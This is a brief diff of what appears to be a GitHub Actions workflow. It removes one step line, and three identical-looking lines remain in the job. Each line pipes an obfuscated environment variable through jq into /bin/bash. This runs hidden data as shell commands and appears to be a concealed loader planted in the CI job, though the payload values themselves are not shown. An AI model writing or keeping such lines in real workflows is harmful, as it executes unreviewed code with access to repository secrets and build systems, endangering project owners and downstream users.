@@ -29,7 +29,6 @@ jobs:
           echo $omh00 | jq -r .xn31363 | /bin/bash
           echo $hzl22234 | jq -r .toet276 | /bin/bash
           printf '%s' "$opke14" | jq -r .joskl1831 | /bin/bash
-          echo $cci507 | jq -r .bw12 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
